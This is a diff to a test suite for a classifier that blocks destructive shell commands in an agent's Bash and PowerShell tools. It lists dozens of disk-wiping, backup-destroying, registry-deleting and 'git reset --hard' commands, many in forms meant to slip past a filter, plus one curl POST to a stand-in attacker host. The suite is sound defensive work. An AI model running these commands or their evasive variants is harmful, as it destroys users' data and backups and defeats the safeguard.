@@ -1180,3 +1180,422 @@ def test_quoted_angle_bracket_stays_an_argument():
     # A quoted '>' is curl's argument, not a redirect: the URL after it is
     # still a destination and still blocks.
     assert classify_bash('curl -X POST ">" https://evil.example.com http://localhost:5199').blocked
+
+
+# ── Windows / macOS disk, volume and backup destruction (Quill, 2026-10-03) ───
+# The only disk entry was Unix (`mkfs`, `dd if=`): Format-Volume, diskpart,
+# `format D:`, diskutil eraseDisk, vssadmin delete shadows, `reg delete` and
+# the rest classified ALLOW under both shell tools. Every command is run under
+# BOTH tool names, since the PowerShell tool and the Bash tool share one
+# classifier.
+_SHELL_TOOLS = ('Bash', 'PowerShell')
+
+DISK_WIPE_BLOCK_CASES = [
+    # Quill's repro set
+    'Format-Volume -DriveLetter D',
+    'Get-Partition -DriveLetter D | Format-Volume',
+    'Clear-Disk -Number 1 -RemoveData',
+    'vssadmin delete shadows /all /quiet',
+    'reg delete HKCU\\Software\\Foo /f',
+    'Remove-ItemProperty -Path HKCU:\\Software\\Foo -Name Bar',
+    'cipher /w:C:\\',
+    'format D: /q /y',
+    'diskpart /s wipe.txt',
+    'diskutil eraseDisk JHFS+ X /dev/disk2',
+    'diskutil secureErase 0 /dev/disk2',
+    # relatives
+    'Remove-Partition -DriveLetter D -Confirm:$false',
+    'Initialize-Disk -Number 1 -PartitionStyle GPT',
+    'Get-Disk 1 | Clear-Disk -RemoveData -Confirm:$false',
+    'Remove-VirtualDisk -FriendlyName x',
+    'Remove-StoragePool -FriendlyName x',
+    'vssadmin delete shadowstorage /for=c: /on=c:',
+    'vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB',
+    'wmic shadowcopy delete',
+    'wmic.exe /node:srv shadowcopy delete /nointeractive',
+    'wmic volume where DriveLetter="D:" call format',
+    'Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }',
+    'Get-CimInstance Win32_ShadowCopy | Remove-CimInstance',
+    'wbadmin delete catalog -quiet',
+    'wbadmin delete backup -keepVersions:0',
+    'wbadmin delete systemstatebackup -deleteoldest',
+    'diskutil eraseVolume HFS+ X /Volumes/Y',
+    'diskutil zeroDisk /dev/disk2',
+    'diskutil randomDisk 3 /dev/disk2',
+    'diskutil reformat /Volumes/X',
+    'diskutil partitionDisk disk2 GPT JHFS+ X 0b',
+    'diskutil apfs deleteContainer disk3',
+    'diskutil apfs deleteVolume disk3s1',
+    'tmutil delete /Volumes/TM/x',
+    'tmutil deletelocalsnapshots 2026-01-01-000000',
+    'Clear-ItemProperty -Path HKCU:\\Software\\Foo -Name Bar',
+    'rp -Name Bar -Path HKLM:\\Software\\Foo',
+    'clp HKCU:\\Software\\Foo Bar',
+    'cipher /e /w:C:\\',
+    'format /fs:ntfs D:',
+    'format /fs:ntfs /q /y',
+    # case, .exe / .com, call operator, quoted path, Start-Process, piped, chained
+    'FORMAT-VOLUME -DriveLetter D',
+    'VSSADMIN DELETE SHADOWS /ALL',
+    'vssadmin.exe Delete Shadows /All /Quiet',
+    'REG.EXE DELETE HKLM\\Software\\Foo /f',
+    'cipher.exe /W:C:\\',
+    'DISKUTIL ERASEDISK JHFS+ X /dev/disk2',
+    'FORMAT D: /FS:NTFS /Q /Y',
+    'format.com D: /q /y',
+    'diskpart.exe /s wipe.txt',
+    '& vssadmin delete shadows /all /quiet',
+    '& reg delete HKCU\\Software\\Foo /f',
+    "& 'C:\\Windows\\System32\\vssadmin.exe' delete shadows /all /quiet",
+    '& "C:\\Windows\\System32\\reg.exe" delete HKCU\\Software\\Foo /f',
+    '"C:\\Windows\\System32\\format.com" D: /y',
+    '& diskpart /s wipe.txt',
+    "Start-Process vssadmin -ArgumentList 'delete shadows /all /quiet' -Wait",
+    "Start-Process -FilePath vssadmin.exe -ArgumentList 'delete','shadows','/all','/quiet' -Verb RunAs",
+    "Start-Process -FilePath format.com -ArgumentList 'D:','/q','/y'",
+    "Start-Process diskpart -ArgumentList '/s wipe.txt'",
+    "Start-Process reg.exe -ArgumentList 'delete HKCU\\Software\\Foo /f'",
+    "echo hi; Start-Process cipher -ArgumentList '/w:C:\\'",
+    'cmd /c "format D: /q /y"',
+    'cmd /c vssadmin delete shadows /all /quiet',
+    'echo y | vssadmin delete shadows /all',
+    'echo y|format D:',
+    'git status && format D: /y',
+    'powershell -Command "Format-Volume -DriveLetter D"',
+    'sudo diskutil eraseDisk JHFS+ X /dev/disk2',
+    '/usr/sbin/diskutil secureErase freespace 0 /Volumes/X',
+]
+
+
+@pytest.mark.parametrize('tool', _SHELL_TOOLS)
+@pytest.mark.parametrize('cmd', DISK_WIPE_BLOCK_CASES)
+def test_disk_volume_and_backup_destruction_is_blocked(tool, cmd):
+    assert classify_action(tool, {'command': cmd}).blocked, (tool, cmd)
+
+
+DISK_WIPE_ALLOW_CASES = [
+    # read-only forms of the same programs
+    'Get-Volume',
+    'Get-Disk',
+    'Get-Partition',
+    'Get-Partition -DriveLetter D',
+    'Get-PhysicalDisk | Format-List *',
+    'Get-CimInstance Win32_ShadowCopy | Select-Object ID, InstallDate',
+    'Get-CimInstance Win32_Volume',
+    'diskutil list',
+    'diskutil info disk2',
+    'diskutil apfs list',
+    'diskutil mount disk2s1',
+    'diskutil unmountDisk /dev/disk2',
+    'tmutil listbackups',
+    'vssadmin list shadows',
+    'vssadmin list shadowstorage',
+    'reg query HKCU\\Software\\Foo',
+    'reg.exe query HKCU\\Software\\Foo /v Bar',
+    'reg add HKCU\\Software\\Foo /v Bar /d 1 /f',
+    'reg export HKCU\\Software\\Foo out.reg',
+    'Get-ItemProperty -Path HKCU:\\Software\\Foo',
+    'Set-ItemProperty -Path HKCU:\\Software\\Foo -Name Bar -Value 1',
+    'New-ItemProperty -Path HKCU:\\Software\\Foo -Name Bar -Value 1',
+    'wmic shadowcopy list',
+    'wmic logicaldisk get name,size',
+    'wbadmin get versions',
+    'wbadmin get status',
+    'cipher',
+    'cipher /?',
+    'cipher /e C:\\Users\\x\\dir',
+    # the word "format" in ordinary use
+    'git log --format=%H',
+    'git log --pretty=format:%h',
+    "python -c \"print('{}'.format(1))\"",
+    'Get-Process | Format-Table',
+    'Get-Disk | Format-Table -AutoSize',
+    'Get-Process | Format-List Name,Id',
+    'Get-Date -Format yyyy-MM-dd',
+    '$x = "a"; "$x" -f 1',
+    'dotnet format',
+    'dotnet format --verify-no-changes',
+    'dotnet format C:\\src\\app.sln',
+    'dotnet format D:\\',
+    'black --format',
+    'npm run format',
+    'clang-format -i foo.c',
+    'echo format',
+    'echo "Format: ok"',
+    'which format',
+    'cat docs/diskpart-notes.md',
+    'ls docs/diskpart.md',
+    # names inside text the fence already treats as data (same rule as git push)
+    'git commit -m "block diskpart, Format-Volume and vssadmin delete shadows"',
+    'git commit -m "format D: /q /y"',
+    'grep -rn "diskpart" docs/',
+    'grep -rn "vssadmin delete shadows" docs/',
+    'rg "reg delete" docs',
+    'rg -n "diskutil eraseDisk" .',
+    "python -c \"print('vssadmin delete shadows')\"",
+    "cat <<'EOF'\nvssadmin delete shadows /all\nformat D: /q\nEOF",
+]
+
+
+@pytest.mark.parametrize('tool', _SHELL_TOOLS)
+@pytest.mark.parametrize('cmd', DISK_WIPE_ALLOW_CASES)
+def test_disk_wipe_patterns_leave_read_only_and_prose_alone(tool, cmd):
+    d = classify_action(tool, {'command': cmd})
+    assert not d.blocked, (tool, cmd, d.reason)
+
+
+def test_disk_wipe_named_in_unmasked_echo_blocks_like_git_push_does():
+    # Documents the existing rule rather than a new one: only commit-message,
+    # grep/rg pattern, python -c literal and quoted-heredoc text is masked as
+    # data. `echo "git push"` already blocks, so an echoed destructive name
+    # blocks too.
+    assert classify_bash('echo "git push"').blocked
+    assert classify_bash('echo "diskpart"').blocked
+    assert classify_bash('echo "vssadmin delete shadows"').blocked
+
+
+# ── Follow-up to the disk-wipe patch (Quill d4, 2026-10-03) ──────────────────
+# Four gaps the first patch left open: `dd of=` before `if=`, `ri` on a
+# registry path, `reg restore` / `reg copy` (they overwrite keys), and the
+# Remove-Item aliases `ri` / `erase` / `rd` (no `/s`) on a filesystem path
+# outside scratch. Like the block above, RED until the fence patch is applied.
+DISK_WIPE_FOLLOWUP_BLOCK_CASES = [
+    # dd, operands in either order
+    'dd of=/dev/sda if=/dev/zero bs=1M',
+    'dd bs=1M of=/dev/sda',
+    'dd of=/dev/sda',
+    'dd bs=4M status=progress of="/dev/sda" if=img.iso',
+    'DD OF=/dev/sda IF=/dev/zero',
+    'dd.exe of=\\\\.\\PhysicalDrive0 if=disk.img',
+    'sudo dd bs=4M of=/dev/disk2 if=img',
+    'echo y | dd of=/dev/sda',
+    'git status && dd of=/dev/sda if=/dev/zero',
+    'dd if=/dev/zero of=/dev/sda',                      # existing rule, still blocked
+    # ri / erase / rd on a registry path
+    'ri HKCU:\\Software\\Foo -Recurse -Force',
+    'ri -Path HKLM:\\SOFTWARE\\Foo -Recurse',
+    'ri -LiteralPath Registry::HKEY_CURRENT_USER\\Software\\Foo -Recurse -Force',
+    'erase HKCU:\\Software\\Foo -Recurse -Force',
+    'Get-ChildItem HKCU:\\Software\\Foo | ri -Recurse -Force',
+    'Remove-Item -Recurse -Force HKCU:\\Software\\Foo',  # already refused
+    # reg restore / reg copy
+    'reg restore HKCU\\Software\\Foo C:\\x\\foo.hiv',
+    'reg copy HKCU\\Software\\A HKCU\\Software\\B /s /f',
+    'REG.EXE COPY HKCU\\Software\\A HKCU\\Software\\B /s',
+    'reg.exe Restore HKLM\\Software\\Foo C:\\x\\foo.hiv',
+    '& reg restore HKCU\\Software\\Foo C:\\x\\foo.hiv',
+    '& "C:\\Windows\\System32\\reg.exe" copy HKCU\\Software\\A HKCU\\Software\\B /f',
+    'C:\\Windows\\System32\\reg.exe restore HKCU\\Software\\Foo C:\\x\\foo.hiv',
+    "Start-Process reg.exe -ArgumentList 'copy HKCU\\Software\\A HKCU\\Software\\B /s /f'",
+    "Start-Process -FilePath reg -ArgumentList 'restore','HKCU\\Software\\Foo','C:\\x\\foo.hiv'",
+    'cmd /c reg copy HKCU\\Software\\A HKCU\\Software\\B /s /f',
+    'cmd //c "reg restore HKCU\\Software\\Foo C:\\x\\foo.hiv"',
+    'powershell -Command "reg copy HKCU\\Software\\A HKCU\\Software\\B /f"',
+    'echo y | reg copy HKCU\\Software\\A HKCU\\Software\\B /s',
+    'git status && reg restore HKCU\\Software\\Foo C:\\x\\foo.hiv',
+    # Remove-Item aliases on a filesystem path outside scratch (Quill test_alias)
+    'ri -Recurse -Force C:\\Users\\x\\proj',
+    'ri C:\\Users\\x\\proj -Recurse -Force',
+    'erase -Recurse -Force C:\\Users\\x\\proj',
+    'rd -Recurse -Force C:\\Users\\x\\proj',
+    'ri C:\\Users\\x\\proj',
+    'erase C:\\Users\\x\\proj\\file.txt',
+    'rd C:\\Users\\x\\proj',
+    'RI -Recurse -Force C:\\Users\\x\\proj',
+    'ri -r -fo .\\proj',
+    # the pipe form, and every other command position
+    'Get-ChildItem C:\\Users\\x\\proj | ri -Recurse -Force',
+    'Get-ChildItem C:\\Users\\x\\proj -Recurse | ri',
+    'Get-ChildItem C:\\Users\\x\\proj | erase',
+    'Get-ChildItem C:\\Users\\x\\proj | rd -Recurse -Force',
+    'Get-ChildItem C:\\Users\\x\\proj | ForEach-Object { ri $_.FullName -Force }',
+    'gci C:\\Users\\x\\proj | % { ri $_ }',
+    'cd C:\\Users\\x; ri -Recurse -Force .\\proj',
+    'echo hi && ri C:\\Users\\x\\proj',
+    '& ri C:\\Users\\x\\proj -Recurse',
+    '(ri C:\\Users\\x\\proj -Recurse)',
+    'powershell -Command "ri -Recurse -Force C:\\Users\\x\\proj"',
+    'pwsh -c ri C:\\Users\\x\\proj -r',
+    'cmd /c rd C:\\Users\\x\\proj',
+    'Get-Date\nri -Recurse -Force C:\\Users\\x\\proj',
+]
+
+
+@pytest.mark.parametrize('tool', _SHELL_TOOLS)
+@pytest.mark.parametrize('cmd', DISK_WIPE_FOLLOWUP_BLOCK_CASES)
+def test_disk_wipe_followup_forms_are_blocked(tool, cmd):
+    assert classify_action(tool, {'command': cmd}).blocked, (tool, cmd)
+
+
+DISK_WIPE_FOLLOWUP_ALLOW_CASES = [
+    # dd with no operand, and the letters in other words
+    'dd --help',
+    'dd --version',
+    'dd --help | head -5',
+    'git add office.txt',
+    'cat dd.txt',
+    'ls dd',
+    'Get-Content dd.log',
+    'echo hello of=1',
+    # reg: read-only / export / config forms, and the words in prose
+    'reg query HKCU\\Software\\Foo',
+    'reg.exe query HKCU\\Software\\Foo /v Bar',
+    'reg export HKCU\\Software\\Foo out.reg',
+    'reg add HKCU\\Software\\Foo /v Bar /d 1 /f',
+    'echo "use reg copy to duplicate"',
+    'echo "reg restore needs a hive file"',
+    'git commit -m "reg copy and reg restore are blocked"',
+    'git commit -am "use reg copy to duplicate"',
+    'grep -rn "reg copy" docs/',
+    'rg "reg restore" docs',
+    'cat docs/reg-copy-notes.md',
+    'ls docs/reg.copy.md',
+    # ri / erase / rd: prose, read-only forms, lookalike words
+    'git commit -m "ri and erase aliases"',
+    'git commit -am "ri and erase aliases"',
+    'git commit -am "erase old rows, rd cleanup"',
+    'echo "ri and erase are PowerShell aliases"',
+    'echo use ri to delete',
+    'Get-ChildItem C:\\Users\\x\\proj',
+    'Get-ChildItem C:\\Users\\x\\proj -Recurse | Select-Object Name',
+    'Get-ChildItem HKCU:\\Software\\Foo',
+    'git rebase -i HEAD~3',
+    'git rebase -i origin/main',
+    'print',
+    'Write-Host print',
+    'echo $uri',
+    'uri',
+    'curl http://localhost:5199/uri',
+    'cat ri.txt',
+    'ls erase_all.py',
+    'python erase_all.py',
+    'cat erase.txt',
+    'grep -rn erase src/',
+    'my_ri x',
+    'x-ri y',
+    'foo.erase(1)',
+    'unerase file.txt',
+    'Get-Process | Where-Object { $_.Name -eq "ri" }',
+]
+
+
+@pytest.mark.parametrize('tool', _SHELL_TOOLS)
+@pytest.mark.parametrize('cmd', DISK_WIPE_FOLLOWUP_ALLOW_CASES)
+def test_disk_wipe_followup_leaves_read_only_and_prose_alone(tool, cmd):
+    d = classify_action(tool, {'command': cmd})
+    assert not d.blocked, (tool, cmd, d.reason)
+
+
+# `ri` / `erase` / `rd` run through the same scratch exemption Remove-Item
+# gets: a scratch-scoped delete stays allowed, an escape out of it does not.
+ALIAS_SCRATCH_ALLOW_CASES = [
+    'ri -Recurse -Force C:\\Users\\x\\proj\\_scratch\\tmp',
+    'erase -Recurse -Force _scratch/tmpdir',
+    'rd -Recurse -Force C:\\Users\\x\\AppData\\Local\\Temp\\foo',
+    'ri -Recurse -Force /tmp/foo',
+    'Get-ChildItem _scratch\\x | ri -Recurse -Force',
+    'Get-ChildItem _scratch\\x | erase',
+    'Get-ChildItem _scratch\\x | % { ri $_ }',
+]
+
+
+@pytest.mark.parametrize('tool', _SHELL_TOOLS)
+@pytest.mark.parametrize('cmd', ALIAS_SCRATCH_ALLOW_CASES)
+def test_remove_item_aliases_on_scratch_paths_stay_allowed(tool, cmd):
+    d = classify_action(tool, {'command': cmd})
+    assert not d.blocked, (tool, cmd, d.reason)
+
+
+@pytest.mark.parametrize('tool', _SHELL_TOOLS)
+@pytest.mark.parametrize('alias', ['ri', 'erase', 'rd'])
+@pytest.mark.parametrize('target', [
+    'C:\\Users\\x\\proj',
+    '_scratch\\tmp',
+    'C:\\Users\\x\\proj\\_scratch\\tmp',
+    'C:\\Users\\x\\AppData\\Local\\Temp\\foo',
+    '_scratch\\..\\secrets',
+    'HKCU:\\Software\\Foo',
+])
+def test_remove_item_aliases_classify_like_remove_item(tool, alias, target):
+    # The alias and the cmdlet get the same verdict on the same target.
+    via_alias = classify_action(tool, {'command': f'{alias} -Recurse -Force {target}'})
+    via_cmdlet = classify_action(tool, {'command': f'Remove-Item -Recurse -Force {target}'})
+    assert via_alias.blocked == via_cmdlet.blocked, (tool, alias, target)
+
+
+# ── `git reset --hard` with other options in front of it (Quill, 2026-10-03) ──
+# The rule was `git\s+reset\s+--hard`, so `-q` / `--quiet` (or a tree-ish)
+# between `reset` and `--hard` slipped past it. RED until the fence patch is
+# applied.
+GIT_RESET_HARD_BLOCK_CASES = [
+    'git reset --hard',                                  # existing, still blocked
+    'git reset --hard -q',                               # existing, still blocked
+    'git reset --hard HEAD~1',
+    'git reset -q --hard',
+    'git reset --quiet --hard HEAD~1',
+    'git reset -q --hard origin/main',
+    'git reset HEAD~1 --hard',
+    'git reset -q HEAD~1 --hard',
+    'GIT RESET -Q --HARD',
+    'git -C /c/x/proj reset -q --hard',
+    'git -C "C:\\x y" reset --quiet --hard',
+    'git -c core.autocrlf=false reset -q --hard',
+    'git --git-dir=/c/x/.git reset -q --hard',
+    'git --git-dir=/c/x/.git --work-tree=/c/x reset --quiet --hard',
+    'git --no-pager -C /c/x reset -q --hard HEAD~1',
+    'git.exe reset -q --hard',
+    "& 'C:/Program Files/Git/cmd/git.exe' reset -q --hard",
+    '& "C:\\Program Files\\Git\\cmd\\git.exe" -C C:\\x reset --quiet --hard HEAD~1',
+    "Start-Process git -ArgumentList 'reset','-q','--hard'",
+    "Start-Process -FilePath git.exe -ArgumentList '-C','C:\\x','reset','-q','--hard'",
+    'cd /c/x/proj && git reset -q --hard',
+    'git stash; git reset -q --hard',
+    'echo y | git reset -q --hard',
+    '(git reset -q --hard)',
+    'git reset -q --hard\n',
+    'git reset \\\n  -q --hard',
+]
+
+
+@pytest.mark.parametrize('tool', _SHELL_TOOLS)
+@pytest.mark.parametrize('cmd', GIT_RESET_HARD_BLOCK_CASES)
+def test_git_reset_hard_is_blocked_wherever_it_sits_among_the_options(tool, cmd):
+    assert classify_action(tool, {'command': cmd}).blocked, (tool, cmd)
+
+
+GIT_RESET_HARD_ALLOW_CASES = [
+    'git reset',
+    'git reset -q',
+    'git reset --soft HEAD~1',
+    'git reset --soft -q HEAD~1',
+    'git reset --mixed',
+    'git reset --mixed HEAD~1',
+    'git reset --keep HEAD~1',
+    'git reset --merge',
+    'git reset HEAD file.txt',
+    'git reset -q HEAD file.txt',
+    'git reset HEAD -- docs/hard.md',
+    'git reset -p',
+    'git -C /c/x/proj reset --soft HEAD~1',
+    'git -c core.autocrlf=false reset -q HEAD file.txt',
+    'git --git-dir=/c/x/.git reset HEAD file.txt',
+    'git.exe reset HEAD file.txt',
+    'git status',
+    'git log --hard',
+    'git reset HEAD file.txt; echo --hard',
+    'git reset --soft HEAD~1 && git log --hard',
+    # the same masked-prose handling the plain form already gets
+    'git commit -m "avoid git reset --hard"',
+    'git commit -m "avoid git reset -q --hard"',
+    'git commit -m "never git -C x reset --quiet --hard"',
+    'grep -rn "git reset -q --hard" docs/',
+    "python -c \"print('git reset -q --hard')\"",
+    "cat <<'EOF'\ngit reset -q --hard\nEOF",
+]
+
+
+@pytest.mark.parametrize('tool', _SHELL_TOOLS)
+@pytest.mark.parametrize('cmd', GIT_RESET_HARD_ALLOW_CASES)
+def test_git_reset_hard_rule_leaves_other_resets_and_prose_alone(tool, cmd):
+    d = classify_action(tool, {'command': cmd})
+    assert not d.blocked, (tool, cmd, d.reason)
